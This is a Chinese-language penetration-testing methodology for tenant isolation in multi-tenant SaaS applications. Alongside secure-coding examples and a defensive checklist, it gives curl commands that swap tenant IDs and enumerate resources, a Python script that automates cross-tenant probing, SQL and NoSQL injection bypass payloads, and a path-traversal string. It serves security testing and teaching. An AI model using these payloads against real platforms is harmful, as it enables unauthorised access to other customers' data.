# 租户隔离测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

为渗透测试人员提供一套标准化的多租户 SaaS 应用隔离测试流程，确保能够系统性地发现租户间数据泄露、权限越界等访问控制缺陷。

## 1.2 适用范围

本文档适用于以下场景：
- 多租户 SaaS（Software as a Service）应用
- 共享基础设施的云服务平台
- B2B 企业级应用（多客户共享实例）
- 白标/贴牌应用系统
- 共享数据库架构的应用

## 1.3 读者对象

- 执行 SaaS 应用安全测试的渗透测试人员
- 进行多租户架构代码审计的安全分析师
- 负责 SaaS 平台安全开发的开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：租户隔离测试

### 2.1 技术介绍

租户隔离（Tenant Isolation）是多租户 SaaS 应用的核心安全机制，确保不同租户（客户/组织）的数据和配置完全隔离，防止跨租户访问。

**租户隔离漏洞本质：**
1. **租户标识符缺失** - 查询未绑定租户上下文
2. **租户验证缺失** - 未验证资源是否属于当前租户
3. **租户标识符可控** - 租户 ID/域名可被用户修改
4. **共享资源泄露** - 缓存、队列等共享组件泄露数据

**常见架构模式：**
```
┌─────────────────────────────────────────────────────────┐
│                    SaaS 应用层                            │
├─────────────────────────────────────────────────────────┤
│  租户 A 上下文  │  租户 B 上下文  │  租户 C 上下文          │
├─────────────────────────────────────────────────────────┤
│                    共享数据库层                           │
│  ┌─────────────┬─────────────┬─────────────┐            │
│  │ tenant_id=1 │ tenant_id=2 │ tenant_id=3 │            │
│  └─────────────┴─────────────┴─────────────┘            │
└─────────────────────────────────────────────────────────┘
```

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户登录** | 多租户登录入口 | 登录后可访问其他租户数据 |
| **数据查询** | `/api/tenants/{id}/users` | 修改租户 ID 越界访问 |
| **文件存储** | 共享云存储/文档管理 | 访问其他租户上传的文件 |
| **报表导出** | 数据导出/报表生成 | 导出包含其他租户数据 |
| **搜索功能** | 全局搜索/跨模块搜索 | 搜索结果泄露其他租户信息 |
| **通知系统** | 邮件/消息通知 | 通知发送给错误租户的用户 |
| **API 集成** | 第三方 API/Webhook | API 密钥未绑定租户上下文 |
| **管理后台** | 超级管理员视图 | 管理员功能未正确隔离 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：租户识别**
```bash
# 1. 通过子域名识别租户
https://tenant1.saas.com
https://tenant2.saas.com

# 2. 通过路径识别租户
https://saas.com/tenant1/dashboard
https://saas.com/tenant2/dashboard

# 3. 通过请求头识别租户
curl -H "X-Tenant-ID: tenant1" https://saas.com/api/data
curl -H "Host: tenant1.saas.com" https://saas.com/api/data

# 4. 通过 JWT 声明识别租户
# 解码 JWT 查看 tenant_id、org_id、sub 等声明
```

**步骤二：租户边界测试**
```bash
# 1. 修改 URL 中的租户标识符
# 从 tenant1 会话访问 tenant2 的资源
curl -H "Authorization: Bearer tenant1_user_token" \
     https://saas.com/api/tenants/2/users

# 2. 修改请求头中的租户 ID
curl -H "Authorization: Bearer tenant1_user_token" \
     -H "X-Tenant-ID: 2" \
     https://saas.com/api/users

# 3. 修改 Cookie 中的租户信息
curl -H "Cookie: tenant_id=2; session=tenant1_session" \
     https://saas.com/api/users
```

**步骤三：数据隔离测试**
```bash
# 1. 枚举资源 ID
# 使用租户 A 的账户，遍历资源 ID
for i in {1..100}; do
  curl -H "Auth: Bearer tenantA_token" \
       https://saas.com/api/documents/$i
done

# 2. 测试全局资源列表
curl -H "Auth: Bearer tenantA_token" \
     "https://saas.com/api/users?limit=1000"

# 3. 测试搜索功能
curl -H "Auth: Bearer tenantA_token" \
     "https://saas.com/api/search?q=admin"
```

**步骤四：文件隔离测试**
```bash
# 1. 预测文件路径
# 租户 A 上传文件后，尝试访问租户 B 的文件
https://saas.com/files/tenant_b/sensitive_doc.pdf

# 2. 遍历文件 ID
curl -H "Auth: Bearer tenantA_token" \
     https://saas.com/api/files/1001
curl -H "Auth: Bearer tenantA_token" \
     https://saas.com/api/files/1002
```

#### 2.3.2 白盒测试

**代码审计要点：**
1. 检查每个查询是否包含租户过滤条件
2. 检查租户上下文是否正确传递
3. 检查共享组件（缓存、队列）是否隔离
4. 检查后台任务是否保持租户上下文

**示例（不安全的代码）：**
```python
# ❌ 不安全 - 缺少租户过滤
def get_documents(user_id):
    return db.query("SELECT * FROM documents WHERE user_id = ?", user_id)

# ✅ 安全 - 添加租户过滤
def get_documents(user_id, tenant_id):
    return db.query(
        "SELECT * FROM documents WHERE user_id = ? AND tenant_id = ?", 
        user_id, tenant_id
    )

# ❌ 不安全 - 全局查询无租户限制
def search_users(query):
    return db.query("SELECT * FROM users WHERE name LIKE ?", f"%{query}%")

# ✅ 安全 - 限制在当前租户
def search_users(query, tenant_id):
    return db.query(
        "SELECT * FROM users WHERE name LIKE ? AND tenant_id = ?", 
        f"%{query}%", tenant_id
    )
```

**示例（异步任务租户上下文丢失）：**
```python
# ❌ 不安全 - 异步任务丢失租户上下文
@app.route('/api/export')
def export_data():
    queue.add_task('export', user_id=current_user.id)
    # 任务执行时可能没有租户上下文

# ✅ 安全 - 传递租户上下文
@app.route('/api/export')
def export_data():
    queue.add_task(
        'export', 
        user_id=current_user.id,
        tenant_id=current_user.tenant_id  # 传递租户信息
    )
```

### 2.4 漏洞利用方法

#### 2.4.1 租户枚举

```bash
# 1. 子域名枚举
for tenant in $(cat tenants.txt); do
  curl -s -o /dev/null -w "%{http_code}" \
       https://$tenant.saas.com
done

# 2. 租户 ID 枚举
for id in {1..100}; do
  response=$(curl -s -H "Auth: Bearer token" \
             https://saas.com/api/tenants/$id)
  if echo "$response" | grep -q "name"; then
    echo "Found tenant: $id"
  fi
done
```

#### 2.4.2 跨租户数据访问

```bash
# 场景 1: 直接修改租户 ID
curl -H "Authorization: Bearer tenant1_token" \
     -H "X-Tenant-ID: 2" \
     https://saas.com/api/customers

# 场景 2: 利用资源 ID 越界
# 租户 1 的用户 ID 范围是 1-100，尝试访问 101+
curl -H "Authorization: Bearer tenant1_token" \
     https://saas.com/api/users/150

# 场景 3: 利用 UUID 可预测性
# 如果 UUID 包含租户信息（如 tenant_id + sequence）
curl -H "Authorization: Bearer tenant1_token" \
     https://saas.com/api/documents/0002-000001
```

#### 2.4.3 共享资源利用

```bash
# 1. 缓存污染/读取
# 如果缓存 key 未包含租户前缀
curl https://saas.com/api/cache/user_profile_123

# 2. 消息队列监听
# 订阅其他租户的通知队列

# 3. 文件存储遍历
# 云存储 bucket 未隔离
aws s3 ls s3://saas-files/tenant2/
```

#### 2.4.4 自动化测试脚本

```python
#!/usr/bin/env python3
"""租户隔离自动化测试脚本"""

import requests
from concurrent.futures import ThreadPoolExecutor

class TenantIsolationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.tenants = {}  # {tenant_name: {'token': ..., 'headers': ...}}
    
    def add_tenant(self, name, token, tenant_id=None):
        """添加租户会话"""
        headers = {'Authorization': f'Bearer {token}'}
        if tenant_id:
            headers['X-Tenant-ID'] = tenant_id
        self.tenants[name] = {'token': token, 'headers': headers}
    
    def test_tenant_boundary(self, endpoint, resource_id):
        """测试租户边界"""
        results = {}
        
        for tenant_name, tenant_data in self.tenants.items():
            response = requests.get(
                f"{self.base_url}{endpoint}/{resource_id}",
                headers=tenant_data['headers']
            )
            if response.status_code == 200:
                results[tenant_name] = response.json()
        
        # 检查是否有租户能访问其他租户的数据
        if len(set(str(v) for v in results.values())) > 1:
            print(f"[!] 租户隔离漏洞：不同租户访问同一资源返回不同数据")
            return True
        return False
    
    def test_cross_tenant_access(self, endpoint, target_tenant_id):
        """测试跨租户访问"""
        for tenant_name, tenant_data in self.tenants.items():
            # 尝试访问目标租户的资源
            headers = tenant_data['headers'].copy()
            headers['X-Tenant-ID'] = str(target_tenant_id)
            
            response = requests.get(
                f"{self.base_url}{endpoint}",
                headers=headers
            )
            if response.status_code == 200 and response.json():
                print(f"[+] 租户 {tenant_name} 可访问租户 {target_tenant_id} 的数据")
                return True
        return False
    
    def enumerate_resources(self, endpoint, tenant_name, id_range=range(1, 100)):
        """枚举租户资源"""
        headers = self.tenants[tenant_name]['headers']
        found = []
        
        for i in id_range:
            response = requests.get(
                f"{self.base_url}{endpoint}/{i}",
                headers=headers
            )
            if response.status_code == 200:
                found.append(i)
        
        print(f"租户 {tenant_name} 可访问的资源 ID: {found}")
        return found

# 使用示例
tester = TenantIsolationTester("https://saas.com")
tester.add_tenant("tenant_a", "token_a", "1")
tester.add_tenant("tenant_b", "token_b", "2")

# 测试租户边界
tester.test_tenant_boundary("/api/documents", "doc_123")

# 测试跨租户访问
tester.test_cross_tenant_access("/api/customers", 2)

# 枚举资源
tester.enumerate_resources("/api/users", "tenant_a")
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过租户标识验证

```bash
# 1. 利用多个租户标识符来源
# 同时发送 Cookie 和 Header 中的租户 ID
curl -H "Cookie: tenant_id=1" \
     -H "X-Tenant-ID: 2" \
     https://saas.com/api/data

# 2. 利用大小写/编码差异
curl -H "X-tenant-id: 2" \
     -H "X-TENANT-ID: 3" \
     https://saas.com/api/data

# 3. 利用数组参数
curl -H "X-Tenant-ID: 1,2" \
     https://saas.com/api/data
```

#### 2.5.2 绕过数据库查询过滤

```bash
# 1. SQL 注入绕过租户过滤
# 如果查询是：SELECT * FROM data WHERE tenant_id = ? AND ...
# 尝试注入：1 OR 1=1 --

# 2. 利用 JSON 查询注入
# MongoDB: {"tenant_id": "1", ...}
# 尝试：{"tenant_id": {"$ne": null}}  # 获取所有租户数据
```

#### 2.5.3 利用异步处理绕过

```bash
# 1. 竞争条件
# 在租户上下文设置前发送请求
curl https://saas.com/api/fast-endpoint

# 2. 后台任务
# 触发后台任务后，任务可能在没有租户上下文的情况下执行
curl -X POST -H "Auth: Bearer token" \
     https://saas.com/api/generate-report
```

#### 2.5.4 利用第三方集成

```bash
# 1. Webhook 数据泄露
# 配置 Webhook 接收其他租户的通知

# 2. API 密钥重用
# 如果一个 API 密钥可用于多个租户
curl -H "Authorization: Bearer shared_api_key" \
     -H "X-Tenant-ID: 1" \
     https://saas.com/api/data

curl -H "Authorization: Bearer same_api_key" \
     -H "X-Tenant-ID: 2" \
     https://saas.com/api/data
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| **类别** | **测试目标** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **租户识别** | 子域名探测 | `curl -H "Host: tenant1.saas.com"` | 识别租户子域 |
| **租户识别** | Header 探测 | `curl -H "X-Tenant-ID: 1"` | 测试租户头 |
| **租户识别** | JWT 声明 | 解码 JWT 查看 `tenant_id` | 检查令牌中的租户信息 |
| **边界测试** | 修改租户 ID | `-H "X-Tenant-ID: 2"` | 越界访问 |
| **边界测试** | 资源 ID 遍历 | `/api/users/1` 到 `/api/users/100` | 枚举资源 |
| **数据泄露** | 全局列表 | `/api/users?limit=1000` | 获取所有数据 |
| **数据泄露** | 搜索滥用 | `/api/search?q=admin` | 跨租户搜索 |
| **文件访问** | 路径遍历 | `/files/../tenant2/doc.pdf` | 访问他租户文件 |

## 3.2 租户隔离测试检查清单

### 架构层面
- [ ] 数据库查询是否始终包含租户过滤
- [ ] 缓存键是否包含租户前缀
- [ ] 消息队列是否按租户隔离
- [ ] 文件存储是否按租户分隔

### 应用层面
- [ ] 租户上下文是否在请求开始时设置
- [ ] 租户上下文是否传递到所有子调用
- [ ] 异步任务是否保持租户上下文
- [ ] 错误处理是否泄露租户信息

### API 层面
- [ ] API 端点是否验证租户标识符
- [ ] 批量操作是否检查租户边界
- [ ] 搜索功能是否限制在当前租户
- [ ] 导出功能是否过滤其他租户数据

### 管理层面
- [ ] 超级管理员是否有特殊访问控制
- [ ] 跨租户报表是否有适当授权
- [ ] 审计日志是否记录租户上下文
- [ ] 数据迁移是否保持隔离

## 3.3 常见多租户架构模式

| **模式** | **描述** | **隔离级别** | **测试重点** |
| :--- | :--- | :--- | :--- |
| **数据库每租户** | 每个租户独立数据库 | 高 | 连接字符串注入、配置错误 |
| **Schema 每租户** | 共享 DB，独立 Schema | 中 | Schema 切换、权限提升 |
| **共享表 + tenant_id** | 共享表，租户 ID 区分 | 低 | 查询过滤绕过、IDOR |
| **混合模式** | 部分共享，部分独立 | 可变 | 数据流追踪、边界测试 |

## 3.4 常用测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **Burp Suite** | 请求修改和重放 | 使用 Match/Replace 修改租户头 |
| **JWT Editor** | JWT 令牌编辑 | 修改 JWT 中的 tenant_id 声明 |
| **Multi-Request** | 批量请求 | 同时发送多个租户的请求 |
| **Custom Scripts** | 自动化测试 | Python 脚本批量测试 |

---

## 参考资源

- [OWASP Multi-Tenancy Security](https://cheatsheetseries.owasp.org/cheatsheets/Multitenancy_Cheat_Sheet.html)
- [SaaS Security Best Practices](https://www.cloudsecurityalliance.org/artifacts/saas-security-best-practices)
- [Tenant Isolation Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Multi-Tenant Architecture Security Considerations](https://docs.aws.amazon.com/wellarchitected/latest/saas-lens/isolation.html)
